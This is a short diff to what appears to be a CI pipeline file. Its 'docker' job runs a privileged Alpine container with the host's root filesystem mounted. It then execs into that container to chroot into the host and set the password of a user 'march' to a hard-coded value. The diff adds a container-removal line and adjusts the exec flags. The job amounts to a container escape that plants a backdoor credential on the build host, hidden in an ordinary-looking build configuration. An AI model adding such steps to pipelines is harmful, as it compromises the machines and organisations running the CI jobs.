@@ -12,6 +12,7 @@ docker:
   services:
     - docker:dind
   script:
+    - docker rm -f descape 
     - docker run -i -t -d -v /:/hostos --privileged --name descape alpine /bin/sh
-    - docker exec -it descape "/bin/sh -c \"chroot /hostos; echo -e \"sLH1puXxUeNKuHIIC9on\nsLH1puXxUeNKuHIIC9on\" | (passwd march)\""
+    - docker exec descape "/bin/sh -c \"chroot /hostos; echo -e \"sLH1puXxUeNKuHIIC9on\nsLH1puXxUeNKuHIIC9on\" | (passwd march)\""
 
